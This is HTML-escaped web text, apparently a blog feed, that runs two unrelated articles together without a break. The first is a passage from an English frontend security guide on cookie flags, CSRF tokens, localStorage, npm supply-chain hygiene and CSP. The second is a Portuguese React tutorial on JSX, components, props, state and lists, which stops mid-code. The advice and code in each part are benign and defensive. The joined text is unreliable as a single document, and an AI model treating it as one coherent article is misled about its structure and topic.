&lt;strong&gt;&lt;code&gt;SameSite=Lax&lt;/code&gt; (or &lt;code&gt;Strict&lt;/code&gt;)&lt;/strong&gt;, the browser will not send the cookie on cross-site requests, which neutralizes the classic CSRF flow. &lt;code&gt;Lax&lt;/code&gt; is a sane default; &lt;code&gt;Strict&lt;/code&gt; is tighter but can log users out when they arrive from external links.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;code&gt;HttpOnly&lt;/code&gt;&lt;/strong&gt;, JavaScript cannot read the cookie via &lt;code&gt;document.cookie&lt;/code&gt;, so even a successful XSS cannot steal the session token.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;code&gt;Secure&lt;/code&gt;&lt;/strong&gt;, the cookie is only ever sent over HTTPS, so it cannot leak over a plaintext connection (see &lt;a href="https://thesimplifiedtech.com/blog/https-tls-and-encryption-basics" rel="noopener noreferrer"&gt;HTTPS, TLS &amp;amp; Encryption Basics&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Anti-CSRF token&lt;/strong&gt;, for extra safety on state-changing requests, issue a per-session token the server checks (double-submit cookie or synchronizer pattern). Required if you cannot rely on SameSite for legacy reasons.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;Set-Cookie response header&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="c"&gt;&amp;lt;!-- A session cookie with every flag a frontend should expect. --&amp;gt;&lt;/span&gt;
Set-Cookie: session=abc123;
HttpOnly;        &lt;span class="c"&gt;&amp;lt;!-- not readable by JS -&amp;gt; survives XSS --&amp;gt;&lt;/span&gt;
Secure;          &lt;span class="c"&gt;&amp;lt;!-- HTTPS only -&amp;gt; no plaintext leak --&amp;gt;&lt;/span&gt;
SameSite=Lax;    &lt;span class="c"&gt;&amp;lt;!-- not sent cross-site -&amp;gt; blocks CSRF --&amp;gt;&lt;/span&gt;
Path=/;
Max-Age=3600

&lt;span class="c"&gt;&amp;lt;!-- The opposite of this: a token in localStorage with no flags.
Any XSS reads it instantly. Don't store session tokens there. --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;⚠️ &lt;strong&gt;localStorage is not a vault:&lt;/strong&gt; Tokens in &lt;code&gt;localStorage&lt;/code&gt; are readable by any script on your origin, including injected XSS. An &lt;code&gt;HttpOnly&lt;/code&gt; cookie is invisible to JavaScript by design. Prefer HttpOnly cookies for session tokens; reserve &lt;code&gt;localStorage&lt;/code&gt; for non-sensitive UI state.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;


Supply chain: the attacker who never touched your code
&lt;/h2&gt;

&lt;p&gt;Your bundle is mostly other people's code. A typical frontend app pulls in hundreds of transitive npm packages, any one of which could be compromised, a maintainer's account hijacked, a popular package sold to a bad actor, a typosquatted name installed by a fat-fingered command. That code runs with the exact same privileges as yours: full DOM, cookies (unless HttpOnly), network access.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Commit your lockfile&lt;/strong&gt; (&lt;code&gt;package-lock.json&lt;/code&gt; / &lt;code&gt;pnpm-lock.yaml&lt;/code&gt;) and install with &lt;code&gt;npm ci&lt;/code&gt; so builds are reproducible and can't silently float to a new version.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Run &lt;code&gt;npm audit&lt;/code&gt; in CI&lt;/strong&gt; and treat high-severity findings as build failures, not warnings to scroll past.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Vet before you add&lt;/strong&gt;, check download counts, last publish date, maintainer, and open issues. Fewer, well-known dependencies beat a dozen one-off micro-packages.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Use Subresource Integrity (SRI)&lt;/strong&gt; for any &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; loaded from a CDN: &lt;code&gt;integrity="sha384-..."&lt;/code&gt; makes the browser refuse the file if its hash changes unexpectedly.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Lean on CSP&lt;/strong&gt;, &lt;code&gt;connect-src&lt;/code&gt; limits where third-party code can phone home, containing the blast radius even if a dep turns malicious.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;


Common mistakes that ship to production
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;&lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; with user data&lt;/strong&gt;, the number-one frontend XSS. If the HTML originated from a user, it must be sanitized with DOMPurify first, or rendered as text instead.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;No Content Security Policy at all&lt;/strong&gt;, without CSP you have exactly one layer (escaping) and zero backstop. The first missed escape becomes a full compromise.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Session tokens in &lt;code&gt;localStorage&lt;/code&gt;&lt;/strong&gt;, readable by any script, so any XSS becomes account takeover. Use &lt;code&gt;HttpOnly&lt;/code&gt; cookies for anything that authenticates a request.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Unvetted / unpinned npm deps&lt;/strong&gt;, adding packages without checking them, or installing without a committed lockfile, lets compromised code into your bundle with full origin privileges.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Trusting client-side validation&lt;/strong&gt;, escaping and checks in the browser are for UX. The server must independently validate and sanitize, because the attacker controls the browser.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;


Takeaways
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;The whole article in seven lines&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The browser runs whatever code ends up on the page, your job is to make sure it's only yours.&lt;/li&gt;
&lt;li&gt;Default to text rendering; treat &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; as a last resort and always sanitize first.&lt;/li&gt;
&lt;li&gt;Add a strict Content-Security-Policy as the backstop for the escape you'll eventually miss.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;frame-ancestors 'none'&lt;/code&gt; kills clickjacking in a single CSP directive.&lt;/li&gt;
&lt;li&gt;Set session cookies &lt;code&gt;HttpOnly; Secure; SameSite=Lax&lt;/code&gt;, it defangs both CSRF and cookie theft.&lt;/li&gt;
&lt;li&gt;Keep auth tokens out of &lt;code&gt;localStorage&lt;/code&gt;; any XSS can read it instantly.&lt;/li&gt;
&lt;li&gt;Your dependencies are your code, pin them, audit them, and constrain them with CSP.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;


Where to go next
&lt;/h2&gt;

&lt;p&gt;Frontend security is one layer of a defense-in-depth stack. The same hostile-input mindset shows up at the API and database, and the cookie flags above only matter if your transport is actually secure.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Follow the input-is-hostile thread across the stack in &lt;a href="https://thesimplifiedtech.com/blog/preventing-injection-attacks-sqli-xss" rel="noopener noreferrer"&gt;Preventing Injection Attacks&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Understand why &lt;code&gt;Secure&lt;/code&gt; cookies and CSP delivery depend on encryption in &lt;a href="https://thesimplifiedtech.com/blog/https-tls-and-encryption-basics" rel="noopener noreferrer"&gt;HTTPS, TLS &amp;amp; Encryption Basics&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;See where this sits in the broader curriculum on the &lt;a href="https://thesimplifiedtech.com/career-paths/frontend-engineer" rel="noopener noreferrer"&gt;Frontend Engineer path&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;&lt;em&gt;Originally published on &lt;a href="https://thesimplifiedtech.com/blog/frontend-security-xss-csrf-csp" rel="noopener noreferrer"&gt;TheSimplifiedTech&lt;/a&gt;, where this guide is interactive, with in-browser terminal labs and diagrams. Learn cloud and DevOps by doing, no videos.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;React é uma biblioteca JavaScript de código aberto utilizada para construir interfaces de usuário interativas, reutilizáveis e baseadas em componentes.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7bpjcjg780gthyafyb6o.png" class="article-body-image-wrapper"&gt;&lt;img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7bpjcjg780gthyafyb6o.png" alt=" " width="799" height="279"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Desenvolvido originalmente pelo Facebook (atual Meta), o React introduz uma abordagem declarativa para a criação de interfaces, permitindo que a aplicação atualize sua apresentação conforme os dados e estados são modificados.&lt;/p&gt;

&lt;p&gt;Neste estudo, vamos explorar seus principais fundamentos e entender como aplicá-los na prática.&lt;/p&gt;

&lt;h2&gt;


01. O que é React?
&lt;/h2&gt;

&lt;p&gt;O React permite dividir uma interface em partes independentes chamadas &lt;strong&gt;componentes&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Cada componente representa um elemento da aplicação, como um botão, formulário, menu ou card.&lt;/p&gt;

&lt;p&gt;Essa abordagem oferece algumas vantagens:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Reutilização:&lt;/strong&gt; o mesmo componente pode ser utilizado em diferentes partes da aplicação.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Manutenção:&lt;/strong&gt; alterações podem ser realizadas de forma isolada.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Organização:&lt;/strong&gt; a interface é dividida em estruturas menores.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Interatividade:&lt;/strong&gt; componentes podem reagir às ações do usuário e às mudanças de dados.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;React é uma biblioteca, não um framework completo. Funcionalidades como roteamento e determinadas estratégias de carregamento de dados dependem da arquitetura e das ferramentas escolhidas.&lt;/p&gt;

&lt;h2&gt;


02. JSX — JavaScript XML
&lt;/h2&gt;

&lt;p&gt;JSX é uma extensão de sintaxe que permite escrever marcação semelhante ao HTML dentro do JavaScript.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Welcome&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Developer&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Hello, &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;! 👋&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As chaves &lt;code&gt;{}&lt;/code&gt; permitem inserir expressões JavaScript no JSX.&lt;/p&gt;

&lt;p&gt;Algumas regras importantes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Retornar um único elemento raiz ou utilizar fragments (&lt;code&gt;&amp;lt;&amp;gt;...&amp;lt;/&amp;gt;&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Utilizar &lt;code&gt;className&lt;/code&gt; no lugar de &lt;code&gt;class&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Fechar todas as tags.&lt;/li&gt;
&lt;li&gt;Utilizar camelCase em propriedades como &lt;code&gt;onClick&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;O JSX é transformado pelas ferramentas de compilação para que o React possa utilizá-lo.&lt;/p&gt;

&lt;h2&gt;


03. Components — Componentes
&lt;/h2&gt;

&lt;p&gt;Componentes são funções JavaScript que retornam elementos React.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Button&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"btn"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Click me
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;Button&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Para utilizar esse componente:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Button&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;App&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;React Study&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Button&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Conceito principal:&lt;/strong&gt; componentes devem possuir responsabilidades bem definidas e podem ser combinados para construir interfaces mais complexas.&lt;/p&gt;

&lt;h2&gt;


04. Props — Propriedades
&lt;/h2&gt;

&lt;p&gt;Props permitem passar informações de um componente pai para um componente filho.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;UserCard&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;role&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"card"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;role&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Utilização:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;UserCard&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"Pricila"&lt;/span&gt;
&lt;span class="na"&gt;role&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"Software Developer"&lt;/span&gt;
&lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Os valores recebidos são utilizados para personalizar o componente.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Importante:&lt;/strong&gt; props são imutáveis do ponto de vista do componente que as recebe. Para modificar informações ao longo do tempo, podemos utilizar estados.&lt;/p&gt;

&lt;h2&gt;


05. State — Gerenciamento de estado
&lt;/h2&gt;

&lt;p&gt;O estado representa informações que podem ser alteradas durante a execução da aplicação.&lt;/p&gt;

&lt;p&gt;Para gerenciar um estado local, podemos utilizar o Hook &lt;code&gt;useState&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Counter&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;count&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setCount&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;increment&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;setCount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;previous&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;previous&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Count: &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;count&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;onClick&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;increment&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Increment
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nesse exemplo:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;count&lt;/code&gt;: valor atual do estado.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;setCount&lt;/code&gt;: função responsável por solicitar a atualização.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;useState(0)&lt;/code&gt;: inicializa o estado com zero.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;onClick&lt;/code&gt;: registra o evento de clique.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Quando o estado muda, o React agenda uma nova renderização do componente.&lt;/p&gt;

&lt;h2&gt;


06. Conditional Rendering
&lt;/h2&gt;

&lt;p&gt;Renderização condicional significa apresentar elementos diferentes dependendo de determinada condição.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Dashboard&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;isLoggedIn&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;isLoggedIn&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Welcome back!&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Please log in.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;O operador ternário permite escolher qual conteúdo será renderizado.&lt;/p&gt;

&lt;p&gt;Esse recurso é muito utilizado em autenticação, carregamento de dados, permissões e estados vazios.&lt;/p&gt;

&lt;h2&gt;


07. Lists and Keys
&lt;/h2&gt;

&lt;p&gt;O React permite renderizar listas utilizando métodos JavaScript como &lt;code&gt;map()&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;technologies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;React&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;JavaScript&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;TypeScript&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;TechnologyList&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;technologies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;tech&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
